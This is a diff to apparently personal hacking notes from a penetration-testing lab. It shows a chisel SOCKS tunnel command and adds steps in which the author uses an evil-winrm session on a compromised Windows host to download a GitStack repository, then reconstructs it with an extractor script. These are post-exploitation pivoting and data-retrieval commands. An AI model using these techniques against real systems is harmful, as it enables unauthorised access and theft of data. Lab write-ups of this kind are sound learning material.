@@ -242,4 +242,29 @@ chisel client 10.200.96.150:18000 1080:socks        # On Attacking machine
 
 ![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/598fd07f-f0f0-4590-883e-21819d2ef7ed)
 
+- Through `evil-winrm` I downloaded the git-repo.
+```bash
+cd C:\gitstack\repositories
+
+ls
+    Directory: C:\gitstack\repositories
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/2/2021   7:05 PM                Website.git
+
+download website.git
+                                        
+Info: Downloading C:\gitstack\repositories\website.git to website.git
+                                        
+Info: Download successful!
+```
+- Next, I rename the downloaded `website.git` directory to `.git`, and using the GitHub tool called `extractor` I extract the repo and found the contents of it.
+
+```bash
+└─$ ./extractor.sh <Path to .git repo> <Path to extract repo>
+```
+- I got three directories by extracting.
+
+![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/c9225d33-913a-4cc2-ba56-14e162925fa4)
 
